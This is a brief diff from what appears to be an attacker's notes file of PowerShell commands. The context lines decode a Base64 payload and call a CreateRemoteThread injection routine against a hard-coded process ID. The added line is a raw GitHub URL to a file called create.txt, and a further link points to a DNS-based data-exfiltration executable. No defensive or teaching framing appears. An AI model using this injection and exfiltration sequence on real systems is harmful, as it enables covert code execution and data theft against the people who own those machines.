@@ -4,6 +4,8 @@ $b64 = [System.Convert]::FromBase64String($base)
 [CreateRemoteThread.Program]::Main(@())
 [CreateRemoteThread.Program]::Main(@(8812))
 
+https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/create.txt
+
 ==============================================================================================================================
 
 https://github.com/Arno0x/DNSExfiltrator/raw/refs/heads/master/release/dnsExfiltrator.exe
